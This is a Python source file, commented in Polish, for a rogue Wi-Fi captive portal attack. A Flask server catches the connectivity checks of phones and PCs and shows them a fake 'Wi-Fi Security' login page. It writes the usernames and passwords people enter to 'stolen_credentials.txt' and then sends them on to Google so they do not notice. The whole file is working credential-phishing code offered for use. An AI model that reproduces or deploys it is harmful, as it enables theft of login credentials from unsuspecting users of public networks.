#!/usr/bin/env python3

import threading
import logging
import os
from datetime import datetime
from flask import Flask, request, render_template_string, redirect

class CaptivePortalAttack:
    def __init__(self):
        self.app = Flask(__name__)
        # Plik musi się nazywać tak samo jak w main.py
        self.credentials_file = "stolen_credentials.txt"
        self.is_running = False
        self.server_thread = None
        self.portal_port = 80
        
        # Wyłączenie standardowych logów Flaska (żeby nie śmieciły w konsoli)
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)
        self.logger = logging.getLogger("CaptivePortal")
        logging.basicConfig(level=logging.INFO)

        # --- HTML TEMPLATES ---
        self.style = """
            <style>
                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
                .container { background: white; width: 100%; max-width: 400px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); overflow: hidden; }
                .header { background: #0078d7; padding: 20px; text-align: center; color: white; }
                .header h1 { margin: 0; font-size: 24px; letter-spacing: 1px; }
                .header span { font-size: 40px; display: block; margin-bottom: 5px; } 
                .content { padding: 30px; }
                input[type="text"], input[type="password"], input[type="email"] { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
                .btn { width: 100%; background: #0078d7; color: white; padding: 12px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; margin-top: 10px; font-weight: bold; }
                .btn:hover { background: #005a9e; }
                .links { text-align: center; margin-top: 15px; font-size: 14px; }
                .links a { color: #0078d7; text-decoration: none; font-weight: bold; }
            </style>
        """

        self.login_html = f"""
        <!DOCTYPE html>
        <html>
        <head><title>Security Check</title><meta name="viewport" content="width=device-width, initial-scale=1">{self.style}</head>
        <body>
            <div class="container">
                <div class="header"><span>🔒</span><h1>Wi-Fi Security</h1></div>
                <div class="content">
                    <h3 style="text-align:center; color:#333;">Authentication Required</h3>
                    <p style="text-align:center; color:#666; font-size:14px;">Please login to verify identity and access internet.</p>
                    <form method="POST" action="/login">
                        <input type="text" name="username" placeholder="Email / Username" required>
                        <input type="password" name="password" placeholder="Password" required>
                        <button type="submit" class="btn">Connect</button>
                    </form>
                </div>
            </div>
        </body>
        </html>
        """

        self._setup_routes()

    def _setup_routes(self):
        @self.app.route("/", methods=["GET"])
        def index():
            return render_template_string(self.login_html)
        
        # Przechwytywanie prób sprawdzenia połączenia (Android/iOS/Windows)
        @self.app.route("/generate_204")
        @self.app.route("/ncsi.txt")
        @self.app.route("/connecttest.txt")
        @self.app.route("/hotspot-detect.html")
        @self.app.route("/canonical.html")
        def captive_probes():
            return redirect("/", code=302)

        @self.app.route("/login", methods=["POST"])
        def login():
            user = request.form.get("username")
            pw = request.form.get("password")
            ip = request.remote_addr
            
            # FORMAT ZAPISU - DOKŁADNIE TAKI JAK CHCIAŁEŚ
            # Dodaję timestamp na końcu dla porządku, ale format główny jest zachowany
            data_line = f"====0 first data mail: {user} pass: {pw} ==="
            
            self._save_credentials(data_line)
            
            # Przekierowanie do internetu po "zalogowaniu"
            return redirect("https://google.com")

        # Catch-all: wszystko inne przekieruj na stronę logowania
        @self.app.route("/<path:path>")
        def catch_all(path):
            return redirect("/", code=302)

    def _save_credentials(self, data_line):
        try:
            with open(self.credentials_file, "a") as f:
                f.write(data_line + "\n")
            # Log na konsolę, żebyś wiedział, że coś wpadło
            print(f"\n[+] CAPTURED CREDENTIALS: {data_line}")
        except Exception as e:
            self.logger.error(f"Save error: {e}")

    def start_portal(self, interface, ssid):
        if self.is_running: return True
        self.is_running = True
        
        def run_flask():
            # Host 0.0.0.0 udostępnia serwer w sieci lokalnej
            try:
                # use_reloader=False jest ważne przy uruchamianiu w wątku
                self.app.run(host="0.0.0.0", port=self.portal_port, debug=False, use_reloader=False)
            except Exception as e:
                self.logger.error(f"Flask Error: {e}")

        self.server_thread = threading.Thread(target=run_flask, daemon=True)
        self.server_thread.start()
        return True

    def stop_portal(self):
        self.is_running = False
        # Flask działający w wątku `daemon` zamknie się automatycznie, 
        # gdy główny program (main.py) zostanie zamknięty.
